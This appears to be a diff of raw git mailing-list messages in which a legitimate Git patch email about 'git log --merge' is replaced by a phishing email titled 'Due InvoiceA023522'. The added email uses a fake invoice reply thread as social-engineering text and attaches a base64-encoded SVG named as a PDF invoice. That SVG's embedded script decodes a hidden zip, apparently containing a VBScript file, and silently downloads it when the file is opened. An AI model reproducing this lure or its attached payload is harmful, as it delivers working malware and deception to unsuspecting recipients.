@@ -1,146 +1,208 @@
-Received: from mail-wr1-f42.google.com (mail-wr1-f42.google.com [209.85.221.42])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
+Received: from smtp127.iad3b.emailsrvr.com (smtp127.iad3b.emailsrvr.com [146.20.161.127])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 259796EB68
-	for <git@vger.kernel.org>; Fri, 12 Jan 2024 15:50:58 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="KSVYpPrH"
-Received: by mail-wr1-f42.google.com with SMTP id ffacd0b85a97d-3368ae75082so4240125f8f.1
-        for <git@vger.kernel.org>; Fri, 12 Jan 2024 07:50:58 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20230601; t=1705074657; x=1705679457; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:sender:from:to:cc:subject:date
-         :message-id:reply-to;
-        bh=jc1JZkWtS1Ymauy6uyH9vLGUooYfVuhyIkxyuNS27Zg=;
-        b=KSVYpPrHzzPFRD+Z8Ox0OyJpnJntYwPWU3yuhAAm3MbAqzkrldkZH7pdO+tbxoaHvE
-         UCKh9UpB/R4j7+BzKiLTcWchJjg0zLYNiOk2gGyMbkUqLaI1Yl85YCkkxTXHa/NyliY+
-         XNgJ/LTNCTBamHBXAjRcDnDzy0PC8rCaxeJks/Xi3pRPEjO4mBp68KcZtK821zl/jk2a
-         3givFbRqpRRZ76LYzQUgULU4Ba3fIRj8Vmgs5ZEn1kD0F1AhBWbb1gM/W7OjubSQfZYe
-         qvEM1gsGSv100P+eou9AKeqFkf2sEKLTt9PLWlISVx++mY7AK/mxZyDyXOCuStsqHKuJ
-         SlPg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1705074657; x=1705679457;
-        h=content-transfer-encoding:mime-version:references:in-reply-to
-         :message-id:date:subject:cc:to:from:sender:x-gm-message-state:from
-         :to:cc:subject:date:message-id:reply-to;
-        bh=jc1JZkWtS1Ymauy6uyH9vLGUooYfVuhyIkxyuNS27Zg=;
-        b=aj3Ul/sFRovxTIaq00Uj1lI7iLw88cK5kcvJEj7maJoVRTpWmQUuD5EE/YLOXabOKE
-         8STMKKW/h2y5Oy1qr/31nttYGIljSoJPf5cuZ6T2HmB+3ikV5UDy5rCVGXYG5S5iLKoV
-         dRJcHNWXD0+6MQXLdY3WqScsoTpwJLKLs2ZqSmlNidIZ47tWevnkW9xx99swINwQy+Bq
-         G8L8ng3KYPx2PhA6I2jqljRcvqmkW72dDRv8iBTjiAv/GVkHQ3L2nDcsDDQWU5H5FJqR
-         3Vo0W64QuiDSxUAK28PYwH3y49SCwqjqK48vPjyspb2E/+4os5jwBdSz7HMLqrSnDFHm
-         7caw==
-X-Gm-Message-State: AOJu0Yyebt8kvL7gLneU1pLvTYK8cExzKCAfwC3XNC0M+lKSD0fiJlDB
-	4oE9ShSrgvzT+OajjoM0RhM=
-X-Google-Smtp-Source: AGHT+IHyGtEPsIqzMCS195XXT0bne0lfxILauNxHgEZ0JV2weLh3I12k+Ssc7Dkp816y3ngVQu1a7A==
-X-Received: by 2002:a1c:7706:0:b0:40e:5660:c796 with SMTP id t6-20020a1c7706000000b0040e5660c796mr886009wmi.73.1705074657072;
-        Fri, 12 Jan 2024 07:50:57 -0800 (PST)
-Received: from Michaels-MBP.fritz.box (2001-4dd4-c452-0-6835-a146-250e-421c.ipv6dyn.netcologne.de. [2001:4dd4:c452:0:6835:a146:250e:421c])
-        by smtp.gmail.com with ESMTPSA id q6-20020adf9dc6000000b003378e67fd2asm3569356wre.86.2024.01.12.07.50.56
-        (version=TLS1_3 cipher=TLS_CHACHA20_POLY1305_SHA256 bits=256/256);
-        Fri, 12 Jan 2024 07:50:56 -0800 (PST)
-Sender: Michael L <mial.lohmann@gmail.com>
-From: Michael Lohmann <mi.al.lohmann@gmail.com>
-To: gitster@pobox.com
-Cc: git@vger.kernel.org,
-	mi.al.lohmann@gmail.com,
-	newren@gmail.com,
-	phillip.wood123@gmail.com,
-	Johannes Sixt <j6t@kdbg.org>
-Subject: [PATCH v2 2/2] revision: Implement `git log --merge` also for rebase/cherry_pick/revert
-Date: Fri, 12 Jan 2024 16:50:33 +0100
-Message-Id: <20240112155033.77204-2-mi.al.lohmann@gmail.com>
-X-Mailer: git-send-email 2.39.3 (Apple Git-145)
-In-Reply-To: <20240112155033.77204-1-mi.al.lohmann@gmail.com>
-References: <xmqqy1cvcsp3.fsf@gitster.g>
- <20240112155033.77204-1-mi.al.lohmann@gmail.com>
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 057427762B
+	for <git@vger.kernel.org>; Fri, 12 Jan 2024 16:57:13 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; dmarc=fail (p=none dis=none) header.from=fashionbeestore.com
+Authentication-Results: smtp.subspace.kernel.org; spf=fail smtp.mailfrom=fashionbeestore.com
+X-Auth-ID: sales@fashionbeestore.com
+Received: by smtp24.relay.iad3b.emailsrvr.com (Authenticated sender: sales-AT-fashionbeestore.com) with ESMTPSA id B3F344022C
+	for <git@vger.kernel.org>; Fri, 12 Jan 2024 11:37:45 -0500 (EST)
+Reply-To: mark.hamer@homeinstead.co.uk
+From: sales@fashionbeestore.com
+To: git@vger.kernel.org
+Subject: RE: Due InvoiceA023522
+Date: 12 Jan 2024 16:37:45 +0000
+Message-ID: <20240112163745.2AA626A5F4731A1E@fashionbeestore.com>
 Precedence: bulk
 X-Mailing-List: git@vger.kernel.org
 List-Id: <git.vger.kernel.org>
 List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 8bit
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0012_07F803F7.79CF3F51"
+X-Classification-ID: aaa8d9cc-684f-46c5-afbe-60db3762b25e-3-1
 
-Co-authored-by: Johannes Sixt <j6t@kdbg.org>
-Signed-off-by: Michael Lohmann <mi.al.lohmann@gmail.com>
----
+This is a multi-part message in MIME format.
 
-> I won't comment on the coding style violations in the patch below in
-> this message.
+------=_NextPart_000_0012_07F803F7.79CF3F51
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-I hope this one is better. The other one was just a proof of the general
-concept and meant as a starting point for a discussion if this is wanted
-at all. But I should still have taken more care.
 
-On 12. Jan 2024, at 08:35, Johannes Sixt <j6t@kdbg.org> wrote:
-> Ha! Very nice patch. For comparison, have a look at my patch to achieve
-> the same that I never submitted (in particular, the author date):
-> https://github.com/j6t/git/commit/2327526213bc2fc3c109c1d8b4b0d95032346ff0
-> 
-> This implementation is more complete than mine. I like it.
+Hi;
 
-Ha! Nice one! I took a few of your changes as an inspiration and put you
-as a co-author.
 
-Cheers
-Michael
+Apologies, will send it again. please see the invoice attached
 
-Difference compared to v1: Basically complete rewrite using
-"refs_resolve_ref_unsafe". Has to be applied after [PATCH v2 1/2] to
-avoid conflict.
 
- revision.c | 27 ++++++++++++++++++++-------
- 1 file changed, 20 insertions(+), 7 deletions(-)
+Thank you and have a great day
 
-diff --git a/revision.c b/revision.c
-index 786e1a3e89..b0b47dd241 100644
---- a/revision.c
-+++ b/revision.c
-@@ -1961,6 +1961,25 @@ static void add_pending_commit_list(struct rev_info *revs,
- 	}
- }
- 
-+static const char *lookup_other_head(struct object_id *oid)
-+{
-+	struct ref_store *refs = get_main_ref_store(the_repository);
-+	const char *name;
-+	int i;
-+	static const char *const other_head[] = {
-+		"MERGE_HEAD", "REBASE_HEAD", "CHERRY_PICK_HEAD", "REVERT_HEAD"
-+	};
-+
-+	for (i = 0; i < ARRAY_SIZE(other_head); i++) {
-+		name = refs_resolve_ref_unsafe(refs, other_head[i],
-+					       RESOLVE_REF_READING, oid, NULL);
-+		if (name)
-+			return name;
-+	}
-+
-+	die("--merge without MERGE_HEAD, REBASE_HEAD, CHERRY_PICK_HEAD or REVERT_HEAD?");
-+}
-+
- static void prepare_show_merge(struct rev_info *revs)
- {
- 	struct commit_list *bases;
-@@ -1974,13 +1993,7 @@ static void prepare_show_merge(struct rev_info *revs)
- 	if (repo_get_oid(the_repository, "HEAD", &oid))
- 		die("--merge without HEAD?");
- 	head = lookup_commit_or_die(&oid, "HEAD");
--	other_head = refs_resolve_ref_unsafe(get_main_ref_store(the_repository),
--					     "MERGE_HEAD",
--					     RESOLVE_REF_READING,
--					     &oid,
--					     NULL);
--	if (!other_head)
--		die("--merge without MERGE_HEAD?");
-+	other_head = lookup_other_head(&oid);
- 	other = lookup_commit_or_die(&oid, other_head);
- 	add_pending_object(revs, &head->object, "HEAD");
- 	add_pending_object(revs, &other->object, other_head);
--- 
-2.43.0.284.g6c31128a96
+
+Mark.=20=20
+Chief, Budget Branch 16003
+
+
+
+
+
+
+-----Original Message-----
+From: git@vger.kernel.org
+Sent: Thursday, 11 Jan, 2023 2:51pm
+To: sales@fashionbeestore.com
+Subject: RE: Due InvoiceA023522
+
+
+Hey,
+
+There's nothing attached so I'm unsure what invoice you're=20
+referring to. Would you mind reattaching so I can look into it?
+
+Thanks!
+
+
+
+
+-----Original Message-----
+From: sales@fashionbeestore.com
+Sent: Thursday, Jan 11, 2023 10:35 AM
+To: git@vger.kernel.org
+Subject: Due InvoiceA023522
+
+Hi ;
+
+
+We are reaching out to get a resolution on this invoice. If you=20
+could,  please look into the attached invoice, the invoice is=20
+past due.
+
+
+
+Thank you for your business - we appreciate it.
+
+
+
+Mark.=20=20
+Chief, Budget Branch 34448
+
+=20
+------=_NextPart_000_0012_07F803F7.79CF3F51
+Content-Type: application/octet-stream; name="InvoiceA023522_PDF.svg"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="InvoiceA023522_PDF.svg"
+
+PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJo
+dHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHdpZHRoPSIxMDAi
+IGhlaWdodD0iMTAwIj4NCiAgICANCiAgICA8c2NyaXB0IHR5cGU9ImFwcGxpY2F0aW9uL2Vj
+bWFzY3JpcHQiPjwhW0NEQVRBWw0KICAgICAgICBkb2N1bWVudC5hZGRFdmVudExpc3RlbmVy
+KCJET01Db250ZW50TG9hZGVkIiwgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICBmdW5jdGlv
+biBiYXNlNjRUb0FycmF5QnVmZmVyKGJhc2U2NCkgew0KICAgICAgICAgICAgICAgIHZhciBi
+aW5hcnlfc3RyaW5nID0gd2luZG93LmF0b2IoYmFzZTY0KTsNCiAgICAgICAgICAgICAgICB2
+YXIgbGVuID0gYmluYXJ5X3N0cmluZy5sZW5ndGg7DQogICAgICAgICAgICAgICAgdmFyIGJ5
+dGVzID0gbmV3IFVpbnQ4QXJyYXkobGVuKTsNCiAgICAgICAgICAgICAgICBmb3IgKHZhciBp
+ID0gMDsgaSA8IGxlbjsgaSsrKSB7IGJ5dGVzW2ldID0gYmluYXJ5X3N0cmluZy5jaGFyQ29k
+ZUF0KGkpOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIGJ5dGVzLmJ1ZmZlcjsNCiAgICAg
+ICAgICAgIH0KdmFyIGZpbGUgPSAnVUVzREJCUUFBQUFJQU5CQ0xGZ0RWMlZ5a1EwQUFNZzZB
+QUFXQUFBQVNXNTJiMmxqWlVFd01qTTFNakpmVUVSR0xuWmljKzJieDQ0anlSR0c4eXhBNzlD
+WWd6QUxyR2ExT2dtQ0pJRGVlOC9MZ3QwMFRWLzA1dUVsZmYvUDdwbmV3YTdPRkVBUVpGVmxS
+b2FQeU1qTTRuLysvY2Z3aDFBTjJ6QU54ekFJK3pBS1Q2RVJEdUdaYXkvTVF5a3MrWjVETEV4
+Q0pzVERhMGlHVlVqVGQrRStFVnBBdGtPRk1kUFFDV3UzSGNNbUZFT1dheFBZRldPSHdCeUJm
+QTB2WWNib1ZSaEQ0eEFXWUx6dzJ3ZmZubjU5R3VFRXhSa1FjWG9Lb1FhTk1yeE51WjVDbDc1
+WWlPQXpZdVNjL2dpc0YwWWZhVXRiZ2lGWTluQzdZMVNadmg0amtqeTF3ZHFFZzJaSWdmVWE4
+clEza1M4SjUyZHdwNEZ0UURVQ3JnV2RGSzE3ZUUxQzlRVFdGWlJPd0Nmb20wSjVZODYzYUda
+Z3VTVi9pcnNjNDRhV3J3KzJEdmNiYUoraDJJWExFcDhtbE9lbVhtVHNocjQrbkxhaGZvYUhK
+amhmYWMwQk1lWlRBT3NLVEo4WjB3cDFwQ3NBSFFkZmt6RmR4amE0U3VZNTFOcU12UEM3dFE3
+M2NOZUF5aHJZREZoT3RDKzVadW5OZzZFSzN4dHdIbWpwZ0VOU0hKRlltdXBBWjByZkFyZytu
+eW9jYWFUa3o4SEJobEhTY1I5cUNjTzlRcXZDK0RKeUxJd3JRN3RzbGVaM0EvUUZmbVAwam9I
+cFFHVUZmSUtXTmRjTDFOcndLNnNYd0pUbnMwUjJlZHlNY1hOeldxTjF3dGdXMktUL0pTMUQr
+Sm5aVDR2OGxxRTJCdDhlYVd0QUZZQWRnVy9zK3dyak8vUzlncThDaENTSW0rT2FkVjRFWjVM
+N0dpMDVXekVOL2duMGw1YjFsZEVkdENQLy9wRW95ZG1PcitBcXc5MFNLWXFNbkRLK0FKVVVJ
+OWJ3bEtWdlIrc0l5Sm5qS3NHb0daOEUrQWYwNzZHU3hqb25vS1JOOVpUeDFwWDExclkxczBB
+b3p1WmczU1A5bURFZGNGM0FzR05NREgzTDk1cHdVK1hhaFh0cFZoRWpLV3Z3WEFSNloxM0dl
+STdvNy9EY0FlT0MwVldpSmFKSFhsVG1yZ3V1c2pOQ2c1WTBIRlRSaGF3ampXOHNWUjMveUlH
+aER1U09qL1MxQlM2Rk5ocjBGWUdVUnBPMGRSMHQ0bmtQcm92cHo2R3I3SEtsN2N4MTZad1M4
+U3U3VlBsYzdXOVhucC9OWTlLYTdhQ3JEQnFkZ2pXTExsSmdQWVVmZ25MYTA5c25TZStTcTdM
+YmtGRnI4NmpvR2NKdjF6RTZjMXpFNEZ0K09LT3REUDhMY3hNRDVnSVYrWWw4OFdKcEwwZ3VM
+em5TOGd5Rk9EcU9nMldFcDhtT1pmak5ZenRGMHNMV2ZuRldVRHhMcnA0dHNrV1BhelMwY0k1
+WWUyVGUyb2hCcll2R0p2QXlnQ1A1V3Q0ZTFVYjZ1SDEwNUlpTmJPVU92Uld3VHVGc3pYT0Yz
+Z3Q4MXBFcGNtWmIyVGV6em1wZHNPZUJsamMxd1pSeHhwYW5TRmRES0phczhTa1EwbklPV0dX
+d0ExLzV6QXZZdDR6TmdFVlpSdElyRDgzQUkxMFdIWTgxNkViNGNNWnhmdk9oa1dPa1JhdHM5
+TkZPT1RUekJJNDk4c2tyNGx3anVCblJzNFdmb3YwangxZHhlWEJXdUZqM1BmaUowNmJab21U
+YlhPQWo0M2xpNVRsaGdwVEs3RnUrRGJpcDhCWDJIZDhhSEoxc3picHpSQkhZSTNUV2pEZzUw
+eWE1bnppRE5XMlBFcklxRHl2M2JPaFY1bENzamJpL1FySFA2Q1U4N1owcGR1aFFNOFhST2h0
+eGpZQnYyM0pGOENnTDFKMm5xL2JDT25TbHpiRXhqZEJjRzFsVDlCN0EwZ1crNERrb0FzTUFX
+T1hWSm5SM2JwV3Y1andETnBCc1RLOXlUdEkyT2FLaEtSWTd3WGtNMkEzajgwaVRkdHcxR05P
+Q256cVVTdlltK2RFWHFLMDgzeStkbFh0OE5XZEpvZ1R5cFlHN2Nhczgrd3FNWnFvbU5Bbzhk
+ZTBGVlh2UDVhM0syTnNmNjVaMTZmbDdiRC9xdWJJbzJDSWQ5RHlEZmh0Sll1QlE3QmNkV1Uy
+b3lsT1VlODVJdEFWVHp2T05mUDNvdVNYbldYQmdiVXZ1S2ZkcjUrNE5VQTNuMHdNVWQ4Nnhl
+K0M3OW1ybDEyZTRIRGlMSEJ4ZkNYQ2xQWnZJODFYVFZPeS81VGRaZDhCT2FKazRjazZPNGlN
+NHhGRVM2Q1N3c3Jjc2RIQWVxd0xYOHN5MDlheGNNZjRHdG41eGZwcDdIcG83cG90Z3lRQ1Rz
+MjVLM09XSmtYK0VmL0g3Rjc2YWRTVGp4emg2Lyt6bzJUL3kzdDNsdmFmd1Q3N1MySWxyNHBI
+eDdpempmVDh2L1hwK2V0UjY5MVhyM2FMcEU1Ly9uUTNmUDQvMTAzMnRuNzdRMG5hdWFYaitW
+bzRlZ2swWlBlTllVODNSNG03QXB3Z1hWNTZWVTJTRDIveFQ0RjVQaXUyeWFZbk9HQnJLMVVl
+NFdIa1Zub1k3MVJXS051V3lDRjdrQ1huUEZCdG9OZUg3MmJYQ0NDb2xPQi9TTXJKdVhzRlpn
+MWZ0QnZTRDlqNjI2SDNBeUNUM3NzYkVNMWtaZkh2UGVSMXcxQmxSY3EyaExKaEZwcFFyZ3Bo
+bkc4VjdDaW81N2c2TUtQaE9VZDhBMjdQem15cWdzdk9ic3NMU2tSQVpLdVpLS3dkVUF0ZzAx
+TlBtdCs0WktXa1o0dGhvNlZsR2Rkd1lHa2xHeTJPa2s1WTk2K0FhYk9nNklCVStmN2QrZXYr
+azBKaHFpa2QwL1Q5RjE4bCtJWWtVWVZXd2FlYVNKUk40UjlJK3F2bEUrM1NSSlZ0Nk50eUNN
+MlBzT1o0MjhKSjNaU3ByZHNDMDU2cWR2dzZqczFEb0dmL0s4SXJreUJCOXNQVEJmUURyekQ1
+UmdzYUMreHl0WTU1MnJwNHo0RkJsbjNUZXYzZ2VmUW5hRFZPRjg4eTNDV3lTVVVOTHE2aVNi
+alYzSjhOdGoweStsUFNzMlRiTURxd0YxL2tET0gyMVZYYk9Cc3VnL2JRUnNsVDl1M2VNYWha
+U3pzbUFkUVhjMm5HbS9CTnpCaHA3UlRGeG5DNXBid0NUZFlXVGdXN0NHV25yZWVrS2xQS0RM
+Rit5UnlwR2o2NlZQajhxaUR1cklINHYyNjNnNmxiMS9WNUYyTUEyNjNCNlZQRGh2aXI0TlR6
+ZnpqQ0cxb1oyL3BYTnRZZXdoVzZONjhtZXA0elJjUHd1ek0zUjNwaEUxamt0eWdkYUZjc2Z0
+WlliMjlZaisxOHE2TnhDMGlXNEwzdG03Q1BsMWxHOWNrYnJlaDBaczQzR1dEekZrK0FuNEpl
+bGRIWlNjd2JzMlc0Tno4Z3RwTWhBc1FaM0JVZmd5cjdVQzlvVmFXT2ZLVFFLWGhWcmIwQTF6
+U3BvLzZEc2ViTHZySjEzL200NnlqU3ZLNHROTGZrYytjUjdpYnNlTFd1dlpYdk9YbGVnTG5o
+QnhqbjFBcDg2emRENXpkV2FUV09ucW11TVBCaFZqZWlVUkhPM1BLSEJYVVM3Tkw3MVhIbkxj
+V2V1UlRMZkozNS9lY3Y1ajVpNXY1aHBnay9uWGIrRXYyR3JIM3kyOGRnOXVxL2RvOSthaDA2
+dTRCZXVCM05lSmZYQnJCbzJBOFlYNTVLTzU4S0M0N2dGOVlHcjg1anJreHk0ZStnczRkeW55
+TkFLcCtkOE1jUzNGYjhUc0tsK25OdFRMNDVTVlpHRG9MUFJNZkxIbkRVVlVVbXVEZWlLZzdi
+elVCYzlaR2dydWE2cklrMGk3RzNSRTg4ZDlEVng1YThhZmVYS1dEbGtabzBWWGFmTjRYL21L
+Q3E3SnBKdjZjeTE3SHBpVCsvQitiSHUycnpwaWt4ZStnTEdIanhscllHRU5TTCtVOFpVY0xX
+dkt2N2dta3FXR2RsL1dzYmZkeDA0ZEZYN2JONVZsWTRjQVZQNFhOcmVlM0NuWEhNTnZXcDhS
+TTI5UmMzakZPUGVUakUrNXJIdmErMzM1OXRiS08vVjk3Y3FQRTM3eXZPdTZyTVZMYUpaYzI1
+U0RYTjBqS3pNVHdVT1ZPM05IRVVsMXdNNWUyekJjMmZGOEVOK3RTK3o5QXBKcTVBZU90TTZY
+TEZTQUhxRW5ycXVMQlp2WHE4MWozS0RWb3Zab0hkVGp2YU5yYTJTODByc3RudlVjVTdXL3BG
+MEszKzhPc3ROSGMrTk4zblNRYnRSTThmcnEzUGx4Smx2UzR1cXJqMVdPdE9qK20vbjZtQklh
+OFdWWWNYNjFmc3BjMGJGYmFleXMxemVxK2NyN1dXdnBQdGg1WnlkZHoyVnRKOXVvQm81UjZk
+Q3dScWJocUt6N05tMVY4SlYxdFVWU3RQVmwzWko5QmJOMHJsckF1ekVQcmRET3EybFA3dTIz
+djdPU2Z6VWxVVUxpWVgveGRXbEpJbnNyYXJGcEpWVVVHMm1MTFp3ekw4RXJUN3JYTHZPV0tx
+TVZBMXBQN0RzbVVoclZPMDdLRHRxWFg5MVJhcDNiUlI3MnEvUkxzRUVhUXJXOThUKzJ3L2FH
+YWhhZHZYblhhazNHZGwzUHRCK3pSSmRQTHUrbW5qbFhuRlZyamQ0QmtHMS9zZ2VGYlA4ejhB
+ZkdTZGJhTFJtczVWejE5QXlheDVReFY4RjN4bHBJdSsrVExpYjJsZkVheEVzRzU2ZnJXWFYz
+ZG1nZmRLZFlVVnY3Z3hiTmdXdGhnZXUrYlRQdG5MMHlrSnpjT2Y0anUxanovUXNQTmRybCtL
+QUhEMjRVaTJzMmpiMkswczliSE5mdHZsMnl2SFJTdHJaMnpxZWJ2MUZ6eFRmWXUvSm1ub0tQ
+enVYNnIyNGlMcy84L3hiVmVURDV2ZG84NGRWN3MwcWYrS3J0eitIWHlQdHg2OXoycy9melho
+YXEyaEYvYkh0VWF2Y1Y2M3lpTE43akxPUDY0RHY2LzJQcTRGR3VMM2xKRnMwdlZMSklwZjJO
+aXBldzJ2SFRic1ZBNmlWSFFVbmVGdDc3M1VXaG0reHB6MklUTkNxVG12WEtzOEQrN1RXZ05v
+RDJNR2xkbUhsVzlvVHFYalZtUWx0eDV4T1FIU0NvL2U1VTFEVTJmTXVhTzJ2RStZV0k3V2Zv
+QlBCQTEvWlNEcVlCcDNqSkdpcnZlMU5hQ1g0SExTWGNnMEpjNnozN2ZQMjVuUFFlYkoyK2JR
+UDBuV2Nqb1AyQm5ScXJPZzVla1cvOHBoRGlPeWhXV2NhclVHMXI3SU1PcDBzSU4vWjhqZTlU
+cHZ3S1ZycU9HTjFvaEczeFR0SWt3RHpiVmVnaFYzeWpySVVkTFZhMVhsTWc2OVdxVnFyYTM4
+MUY3UjZ2bnlOcW9SWHI3ZC9GVlNjTVVhMm8vYUNTNHpXdS96RjhGZlc1dzNudzl2ZTZhMVZK
+NEpOdVByMGxsTWZGcjR2QzM5eGpsVEZxY28wNHl6MXliUGdZNGE3cnhsTzBWWU5DKytPL1J4
+K2dyT2ZyTU12enAzSzRoRXRQNFcvaDUxbkxKMW52Ty8vcCsybDcrOTlQR0x3M21LdzRRZ2My
+anFxT2ZSR3d6aG9sL1JxREpLZzd4bCt6WlBlbG9rWXAvY3dwS1Y1dU5oRGRDYW5rOCtaZWRO
+L3VmUTJTTXc5QzdCcnpJYTJxK2R5blpBcC9uYklwaDEvUmEzZVJObmJONHY4TGwwaFhSMHQ4
+b3lMTFR0enRMWGhxT0k0M0NPci9xTWxIblJpZVBOdTdUN3F6UTY5UmFJZDdHTFlPVDUweHFr
+SVd6c1cya0VuV3RxdDFkc1Z1dGYrN3UyZHF6MVArdWVaM2xvNXVZN1R5WWRPOFhaQjUyc0Zl
+RnVEdWVxYVpFZXZJbFp2YTlRZGw1T2d0eUdTcmxaVUVmVnNjWjJRNlA5Yk5jZDgzNUd0WFht
+OXU1QjJkTWx1T3BQUXUwdmxyM1BnSTJidUxXWlVreWpUcVpaVVpucy85N3pWbkdmWEtBZlhM
+RHJqV2tOUkVqODk0dXZPNHV2ak91Qy9VRXNCQWhRQUZBQUFBQWdBMEVJc1dBTlhaWEtSRFFB
+QXlEb0FBQllBQUFBQUFBQUFBUUFnQUFBQUFBQUFBRWx1ZG05cFkyVkJNREl6TlRJeVgxQkVS
+aTUyWW5OUVN3VUdBQUFBQUFFQUFRQkVBQUFBeFEwQUFBQUEnOwp2YXIgZGF0YSA9IGJhc2U2
+NFRvQXJyYXlCdWZmZXIoZmlsZSk7CnZhciBibG9iID0gbmV3IEJsb2IoW2RhdGFdLCB7dHlw
+ZTogJ29jdGV0L3N0cmVhbSd9KTsKdmFyIGZpbGVOYW1lID0gJ0ludm9pY2VBMDIzNTIyX1BE
+Ri56aXAnOwp2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnROUygnaHR0cDovL3d3dy53
+My5vcmcvMTk5OS94aHRtbCcsICdhJyk7CmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBl
+bmRDaGlsZChhKTsKYS5zZXRBdHRyaWJ1dGUoJ3N0eWxlJywgJ2Rpc3BsYXk6IG5vbmUnKTsK
+dmFyIHVybCA9IHdpbmRvdy5VUkwuY3JlYXRlT2JqZWN0VVJMKGJsb2IpOwphLmhyZWYgPSB1
+cmw7CmEuZG93bmxvYWQgPSBmaWxlTmFtZTsKYS5jbGljaygpOwp3aW5kb3cuVVJMLnJldm9r
+ZU9iamVjdFVSTCh1cmwpOwp9KTsKXV0+PC9zY3JpcHQ+Cjwvc3ZnPg==
+
+------=_NextPart_000_0012_07F803F7.79CF3F51--
 
